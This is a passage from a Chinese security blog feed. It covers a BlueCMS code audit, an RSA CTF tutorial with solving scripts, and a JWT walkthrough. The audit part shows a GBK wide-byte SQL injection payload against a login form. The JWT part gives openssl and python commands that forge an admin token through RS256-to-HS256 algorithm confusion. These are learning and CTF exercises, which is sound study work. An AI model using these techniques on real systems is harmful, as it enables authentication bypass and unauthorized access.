showmsg(&apos;评论内容不能为空&apos;);</span><br><span class="line"> &#125;</span><br><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br><span class="line">showmsg(&apos;恭喜你留言成功&apos;, &apos;guest_book.php?page_id=&apos;.$_POST[&apos;page_id&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/09/Vsw06H.jpg" alt="image"></p><p><img src="https://s2.ax1x.com/2019/06/09/VswoBn.jpg" alt="image"></p><h4 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h4><p>数据库是采用gbk编码的，所以在./admin/login.php存在宽字节注入，宽字节原理这里大概讲下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入语句为%df&apos; or 1=1# ,而一般开启了gpc或者是有addslashes函数的会自动给引号加上反斜杆\,\在url编码中是%5c,则MySQL用GBK的编码时，会认为%df%5c是一个宽字符，也就是縗,%df\’ = %df%5c%27=縗’,最后就造成了字符注入。</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_login&apos;)&#123;</span><br><span class="line"> ...</span><br><span class="line"> if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> update_admin_info($admin_name);</span><br><span class="line"> ...</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> showmsg(&apos;您输入的用户名和密码有误&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> showmsg(&apos;欢迎您 &apos;.$admin_name.&apos; 回来，现在将转向管理中心...&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>而check_admin定义是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">global $db;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> &#123;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> return false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/06/10/VyeMwR.jpg" alt="image"></p><p><img src="https://s2.ax1x.com/2019/06/10/Vye3Y6.jpg" alt="image"></p><h4 id="xss注入"><a href="#xss注入" class="headerlink" title="xss注入"></a>xss注入</h4><p>./user.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//编辑个人资料</span><br><span class="line"></span><br><span class="line">elseif($act == &apos;edit_user_info&apos;)&#123;</span><br><span class="line"></span><br><span class="line"> $user_id = intval($_SESSION[&apos;user_id&apos;]);</span><br><span class="line"></span><br><span class="line"> if(empty($user_id))&#123;</span><br><span class="line"></span><br><span class="line"> return false;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">$birthday = trim($_POST[&apos;birthday&apos;]);</span><br><span class="line"></span><br><span class="line">$sex = intval($_POST[&apos;sex&apos;]);</span><br><span class="line"></span><br><span class="line">    $email = !empty($_POST[&apos;email&apos;]) ? trim($_POST[&apos;email&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $msn = !empty($_POST[&apos;msn&apos;]) ? trim($_POST[&apos;msn&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $qq = !empty($_POST[&apos;qq&apos;]) ? trim($_POST[&apos;qq&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $mobile_phone = !empty($_POST[&apos;mobile_phone&apos;]) ? trim($_POST[&apos;mobile_phone&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $office_phone = !empty($_POST[&apos;office_phone&apos;]) ? trim($_POST[&apos;office_phone&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    $home_phone   = !empty($_POST[&apos;home_phone&apos;]) ? trim($_POST[&apos;home_phone&apos;]) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">$address = !empty($_POST[&apos;address&apos;]) ? htmlspecialchars($_POST[&apos;address&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/06/10/V6VaQg.jpg" alt="image"></p><p><img src="https://s2.ax1x.com/2019/06/10/V6Zw9K.jpg" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;bluecms是一种小众cms，适合用来入门代码审计，代码本身一堆漏洞，方便小白快速理解入门&lt;/p&gt;
&lt;h3 id=&quot;0x01-环境搭建&quot;&gt;&lt;a href=&quot;#0x01-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境搭建&quot;&gt;&lt;/a&gt;0x01 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>RSA</title>
    <link href="http://yoursite.com/2019/06/01/rsa/"/>
    <id>http://yoursite.com/2019/06/01/rsa/</id>
    <published>2019-06-01T06:19:14.761Z</published>
    <updated>2019-06-02T06:34:05.856Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RSA简介及步骤"><a href="#RSA简介及步骤" class="headerlink" title="RSA简介及步骤"></a>RSA简介及步骤</h3><p>rsa是非对称密码，即在加解密过程中，加密密钥(公钥)与解密密钥(私钥)不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">乙将公钥传给甲（公钥可公开)</span><br><span class="line">甲使用乙传给的公钥加密要发送的信息原文m，发送给乙密文c；</span><br><span class="line">乙使用自己的私钥解密密文c，得到信息原文m</span><br></pre></td></tr></table></figure></p><ul><li>首先选择两个互为质数p和q，计算模数N=p*q</li><li>计算N的欧拉函数φ=(p−1)*(q−1),然后随机选择一个整数e(1&lt;e&lt;φ),e和φ互质</li><li>取e的模反元数d，公式为ed≡1(modφ(n))</li><li>明文加密后的密文c = pow(m, e, N)</li><li>密文解密后的明文m = pow(c, d, N)</li></ul><p>需要记的一些参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p,q:大整数N的两个因子（factor）</span><br><span class="line">N:大整数N，我们称之为模数（modulus)</span><br><span class="line">e,d:互为模反数的两个指数（exponent）</span><br><span class="line">c,m:密文和明文，这里一般指的是一个十进制的数  </span><br><span class="line">（N,e）：公钥</span><br><span class="line">（N,d）：私钥</span><br></pre></td></tr></table></figure></p><p>上面几个具体的数学概念可参考此链接 <a href="https://www.cnblogs.com/hykun/p/RSA.html" target="_blank" rel="noopener">RSA数学基础</a></p><h3 id="RSA题实战技巧"><a href="#RSA题实战技巧" class="headerlink" title="RSA题实战技巧"></a>RSA题实战技巧</h3><h4 id="0x01-实验吧rsarsa"><a href="#0x01-实验吧rsarsa" class="headerlink" title="0x01 实验吧rsarsa"></a>0x01 实验吧rsarsa</h4><p>题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure></p><p>解题脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">n = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,n)</span><br><span class="line">flag = pow(c,d,N)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><p>这里用到gmpy2模块，可通过pip install gmpy2下载</p><h4 id="0x02-rsaroll"><a href="#0x02-rsaroll" class="headerlink" title="0x02 rsaroll"></a>0x02 rsaroll</h4><p><img src="https://s2.ax1x.com/2019/06/01/V3XGA1.jpg" alt="image"></p><p>N可用网上在线工具分解<a href="http://factordb.com/index.php" target="_blank" rel="noopener">http://factordb.com/index.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">N = 920139713</span><br><span class="line">e = 19</span><br><span class="line">p = 18443</span><br><span class="line">q = 49891</span><br><span class="line">n = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,n)</span><br><span class="line">print(d)</span><br><span class="line">print(N)</span><br><span class="line">c =&quot;&quot;&quot;</span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">c = c.split()</span><br><span class="line"># for i in c:</span><br><span class="line">#     i = int(i)</span><br><span class="line">#     print(pow(i,d,N),end=&apos; &apos;)</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">get = &apos;102 108 97 103 123 49 51 50 49 50 106 101 50 117 101 50 56 102 121 55 49 119 56 117 56 55 121 51 49 114 55 56 101 117 49 101 50 125&apos;</span><br><span class="line">flag1 = get.split()</span><br><span class="line">for i in flag1:</span><br><span class="line">    i = int(i)</span><br><span class="line">    print(chr(i),end=&apos;&apos;)</span><br></pre></td></tr></table></figure></p><h4 id="0x03-强网杯辅助"><a href="#0x03-强网杯辅助" class="headerlink" title="0x03 强网杯辅助"></a>0x03 强网杯辅助</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">flag=open(&quot;flag&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import getPrime,bytes_to_long</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q=getPrime(1024)</span><br><span class="line">e=65537</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print c,e,n</span><br><span class="line"></span><br><span class="line">p=getPrime(1024)</span><br><span class="line">e=65537</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(&quot;1&quot;*32)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print c,e,n</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">output:</span><br><span class="line">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597 65537 14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span><br><span class="line">3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470 65537 14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure><p>import gmpy2<br>import libnum<br>c1 = 2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597<br>e = 65537<br>c2 = 3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470<br>n1 = 14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727<br>n2 = 14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</p><p>p = gmpy2.gcd(n1,n2)<br>q1 = n1/p<br>q2 = n2/p<br>n = int((p-1)<em>(q1-1))<br>N = int(p</em>q1)<br>d = gmpy2.invert(e,n)<br>m = pow(c1,d,N)<br>print(libnum.n2s(m))<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;RSA简介及步骤&quot;&gt;&lt;a href=&quot;#RSA简介及步骤&quot; class=&quot;headerlink&quot; title=&quot;RSA简介及步骤&quot;&gt;&lt;/a&gt;RSA简介及步骤&lt;/h3&gt;&lt;p&gt;rsa是非对称密码，即在加解密过程中，加密密钥(公钥)与解密密钥(私钥)不同&lt;br&gt;&lt;fig
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Json Web Token</title>
    <link href="http://yoursite.com/2019/05/17/jwt/"/>
    <id>http://yoursite.com/2019/05/17/jwt/</id>
    <published>2019-05-17T03:06:57.290Z</published>
    <updated>2019-05-18T12:57:27.436Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><p>一些Web应用程序使用JSON Web令牌即JWT而不是传统的会话cookie。由于其无状态和签名实施，因此存在一些特定于JWT的安全问题。本文介绍了一些可以验证JWT实现是否安全的方法。</p><h3 id="0x01-认识JWT"><a href="#0x01-认识JWT" class="headerlink" title="0x01 认识JWT"></a>0x01 认识JWT</h3><p>基于token（令牌）的用户认证</p><p>JSON Web Token (jwt) 就是其中一个</p><p><img src="https://s2.ax1x.com/2019/05/18/EObOoV.png" alt="image"><br>过程如下：</p><ol><li><p>用户输入其登录信息</p></li><li><p>服务器验证信息是否正确，并返回已签名的token</p></li><li><p>token储在客户端，例如存在local storage或cookie中</p></li><li><p>之后的HTTP请求都将token添加到请求头里</p></li><li><p>服务器解码JWT，并且如果令牌有效，则接受请求</p></li><li><p>一旦用户注销，令牌将在客户端被销毁，不需要与服务器进行交互一个关键是，令牌是无状态的。后端服务器不需要保存令牌或当前session的记录。</p></li></ol><p>服务器不必记住有关令牌或用户的任何信息，因为所有信息都包含在令牌中。</p><p>jwt通常在授权header中。header的内容应该如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure></p><h3 id="0x02-JWT结构"><a href="#0x02-JWT结构" class="headerlink" title="0x02 JWT结构"></a>0x02 JWT结构</h3><p>任意一个jwt格式都像这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-0TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure></p><p>可见有两个点号，分为三个部分，也就是头部、载荷与签名(Header<br>Payload,Signature)，这三个部分都是json格式。</p><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。该部分由base64编码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;:&quot;RS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。<br>这里是用户随意定义的数据，一般用来放一些不敏感的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&quot;adminxxx&quot;,</span><br><span class="line">    &quot;priv&quot;:&quot;other&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该部分也被base64编码</p><p>在线jwt解密网站: <a href="https://jwt.io" target="_blank" rel="noopener">https://jwt.io</a></p><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>签名部分，是由前面两部分header与payload和密钥(secret)组成，采用header里面的算法，前面的一个例子就是RS256算法，最后再对得到的字符串进行一次base64编码，构成令牌token的第三部分</p><h3 id="0x03-JWT攻击技巧"><a href="#0x03-JWT攻击技巧" class="headerlink" title="0x03 JWT攻击技巧"></a>0x03 JWT攻击技巧</h3><p>jwt作为一种身份认证的手段，攻击者可以构造伪造身份进行恶意攻击</p><p>就上部分header中算法alg，签名算法为RS256，那么会选择用私钥进行签名，用公钥进行解密验证</p><p>公钥pubkey一般因为网站的不正当操作容易泄露，但没有私钥仍然无法在第三部分篡改签名信息</p><p>这里就要换个思路了，可以通过修改算法，比如把RS256改为HS256，这样就从非对称密码转到对称密码了</p><p>对称密码只需要一种公钥，此时篡改就贼容易了，后端的验证只根据header的算法类型的话，就会达到攻击者的目的了。</p><h3 id="0x04-实战"><a href="#0x04-实战" class="headerlink" title="0x04 实战"></a>0x04 实战</h3><p>就拿iscc一道题来说，在源码js处可以发现pubkey泄露<br><img src="https://s2.ax1x.com/2019/05/18/EXAWGQ.jpg" alt="image"></p><p>我这里注册的账号是adminkite,构造exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo md5(adminkiteadmin);</span><br></pre></td></tr></table></figure></p><p>再去访问得到pubkey（存储为key.pem）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK</span><br><span class="line">omh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h</span><br><span class="line">Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc</span><br><span class="line">IC+LX+9V/mpyKe9R3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p>然后抓包在list处得到token<br><img src="https://s2.ax1x.com/2019/05/18/EXE0FU.jpg" alt="image"></p><p>解密后为<br><img src="https://s2.ax1x.com/2019/05/18/EXEcO1.jpg" alt="image"></p><p>接下来我们手上只有公钥，那么就把RS256改成HS256，页面开头也说只有admin才能看到flag，那么把priv里的other改成admin，然后保存前面两个部分(header+payload)</p><p>具体后面步骤在国外文章讲的很具体如下</p><p><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/" target="_blank" rel="noopener">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</a></p><p>ascii转十六进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key.pem | xxd -p | tr -d &quot;\\n&quot;</span><br></pre></td></tr></table></figure></p><p>输出签名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5raXRlIiwicHJpdiI6ImFkbWluIn0&quot; | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444d52547a4d39756a6b486d6834326158473061485a6b2f504b0a6f6d68366c6156462b63332b442b6b6c496a58676c6a372b2f77786e7a746e68794f5a70597864746b37466670486133586834506b706435566976774f7531680a4b6b335851595a654d486f76346b57307975532b3552704656315132676d2f4e57475935324561516d70434e465162474e69675a6875393552324f6f4d7475630a49432b4c582b39562f6d70794b65395233774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d</span><br></pre></td></tr></table></figure></p><p>得到签名的十六进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdb7ea430a5c4f8db09917a5dc7e30ced83f80b735a2d228a8a507bf7295f55a</span><br></pre></td></tr></table></figure></p><p>再将十六进制转jwt格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex(&apos;cdb7ea430a5c4f8db09917a5dc7e30ced83f80b735a2d228a8a507bf7295f55a&apos;)).replace(&apos;=&apos;,&apos;&apos;)\&quot;)&quot;</span><br></pre></td></tr></table></figure></p><p>与前面两部分拼接成完整的jwt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5raXRlIiwicHJpdiI6ImFkbWluIn0.zbfqQwpcT42wmRel3H4wztg_gLc1otIoqKUHv3KV9Vo</span><br></pre></td></tr></table></figure></p><p>然后抓包传入，成功得到路径<br><img 